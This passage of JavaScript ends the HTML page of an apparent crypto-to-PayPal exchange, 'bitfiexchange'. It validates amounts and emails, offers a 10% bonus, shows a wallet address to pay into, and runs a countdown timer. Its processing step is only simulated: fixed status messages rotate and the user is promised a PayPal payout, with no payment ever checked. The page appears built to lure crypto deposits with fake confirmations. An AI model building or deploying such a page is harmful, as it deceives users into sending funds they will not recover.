                const amount = parseFloat(elements.cryptoAmount.value) || 0;
                const paypal = elements.paypalEmail.value.trim();
                const confirm = elements.confirmEmail.value.trim();
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

                const priceData = state.currentPrices[state.selectedCrypto?.symbol];
                if (!priceData) return false;

                const usdValue = elements.amountUnit.value === 'usd' ?
                    amount : amount * priceData.price;

                const isValid = usdValue >= state.MINIMUM_USD &&
                               emailRegex.test(paypal) &&
                               paypal === confirm &&
                               paypal.length > 0;

                elements.nextToScreen3.disabled = !isValid;
                
                // Add visual feedback for minimum amount
                if (usdValue > 0 && usdValue < state.MINIMUM_USD) {
                    elements.usdValue.style.color = 'var(--error)';
                } else {
                    elements.usdValue.style.color = '';
                }
                
                return isValid;
            }

            function updateScreen3Details() {
                if (!state.selectedCrypto) return;

                const amount = parseFloat(elements.cryptoAmount.value) || 0;
                const priceData = state.currentPrices[state.selectedCrypto.symbol];

                if (!priceData) return;

                const price = priceData.price;
                let cryptoAmount, usdValue;

                if (elements.amountUnit.value === 'usd') {
                    usdValue = amount;
                    cryptoAmount = amount / price;
                } else {
                    cryptoAmount = amount;
                    usdValue = amount * price;
                }

                const bonus = usdValue * 0.10;
                const finalAmount = usdValue + bonus;

                elements.finalCryptoName.textContent = `${state.selectedCrypto.name} (${state.selectedCrypto.symbol})`;
                elements.finalCryptoAmount.textContent = `${cryptoAmount.toFixed(8)} ${state.selectedCrypto.symbol}`;
                elements.finalUsdValue.textContent = `$${usdValue.toLocaleString('en-US', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                })}`;
                elements.finalBonusAmount.textContent = `$${bonus.toLocaleString('en-US', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                })}`;
                elements.finalPaypalEmail.textContent = elements.paypalEmail.value;
                elements.finalReceiveAmount.textContent = `$${finalAmount.toLocaleString('en-US', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                })}`;
                elements.walletAddress.textContent = state.selectedCrypto.wallet;
                elements.walletCryptoName.textContent = `${state.selectedCrypto.name} (${state.selectedCrypto.symbol})`;
                
                // Update processing modal amount
                elements.processingAmount.textContent = `$${finalAmount.toLocaleString('en-US', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                })}`;
            }

            function startCountdown() {
                let timeLeft = 30 * 60;

                if (state.countdownInterval) clearInterval(state.countdownInterval);

                updateCountdownDisplay(timeLeft);

                state.countdownInterval = setInterval(() => {
                    timeLeft--;

                    if (timeLeft <= 0) {
                        clearInterval(state.countdownInterval);
                        elements.countdown.textContent = "EXPIRED";
                        elements.countdown.style.color = "var(--error)";
                        return;
                    }

                    updateCountdownDisplay(timeLeft);
                }, 1000);
            }

            function updateCountdownDisplay(timeLeft) {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                elements.countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }

            function stopCountdown() {
                if (state.countdownInterval) {
                    clearInterval(state.countdownInterval);
                    state.countdownInterval = null;
                }
            }

            function copyWalletAddress() {
                if (!state.selectedCrypto) return;

                navigator.clipboard.writeText(state.selectedCrypto.wallet)
                    .then(() => {
                        const originalText = elements.copyAddress.innerHTML;
                        elements.copyAddress.innerHTML = '<i class="fas fa-check"></i> Copied!';
                        elements.copyAddress.style.background = 'linear-gradient(135deg, var(--success), var(--success-light))';
                        elements.copyAddress.style.color = 'white';

                        setTimeout(() => {
                            elements.copyAddress.innerHTML = originalText;
                            elements.copyAddress.style.background = '';
                            elements.copyAddress.style.color = '';
                        }, 2000);
                    })
                    .catch(err => {
                        console.error('Failed to copy:', err);
                    });
            }

            function showPaymentProcessing() {
                elements.paymentProcessing.classList.add('active');
                document.body.style.overflow = 'hidden';
                
                // Start processing simulation
                simulateTransactionProcessing();
            }

            function closePaymentProcessing() {
                elements.paymentProcessing.classList.remove('active');
                document.body.style.overflow = '';
                
                if (state.processingInterval) {
                    clearInterval(state.processingInterval);
                    state.processingInterval = null;
                }
                
                // Reset form and show notification
                showNotification('Your transaction is being processed! You will receive $' +
                    elements.finalReceiveAmount.textContent.replace('$', '') +
                    ' from @bitfiexchange on PayPal within 5-15 minutes.');
                
                setTimeout(() => {
                    navigateTo(1);
                    resetForm();
                }, 2000);
            }

            function simulateTransactionProcessing() {
                const statuses = [
                    "Verifying blockchain confirmation",
                    "Confirming transaction details",
                    "Processing your payment",
                    "Preparing PayPal transfer",
                    "Sending funds to your PayPal"
                ];
                
                let currentStatus = 0;
                
                elements.processingStatus.textContent = statuses[currentStatus];
                
                state.processingInterval = setInterval(() => {
                    currentStatus = (currentStatus + 1) % statuses.length;
                    elements.processingStatus.textContent = statuses[currentStatus];
                    
                    // Update estimated time
                    const times = ["4-14 minutes", "3-13 minutes", "2-12 minutes", "1-11 minutes", "0-10 minutes"];
                    elements.processingTime.textContent = times[currentStatus];
                    
                }, 3000);
            }

            function resetForm() {
                document.querySelectorAll('.crypto-card').forEach(card => {
                    card.classList.remove('selected');
                });

                elements.cryptoAmount.value = '';
                elements.amountUnit.value = 'crypto';
                elements.paypalEmail.value = '';
                elements.confirmEmail.value = '';

                state.selectedCrypto = null;
                elements.nextToScreen2.disabled = true;
                elements.nextToScreen3.disabled = true;

                elements.tradingViewWidget.classList.remove('active');
                updateAmounts();
            }

            function showNotification(message) {
                elements.notification.querySelector('span').textContent = message;
                elements.notification.classList.add('show');

                setTimeout(() => {
                    elements.notification.classList.remove('show');
                }, 5000);
            }
        }
    </script>
</body>
</html>
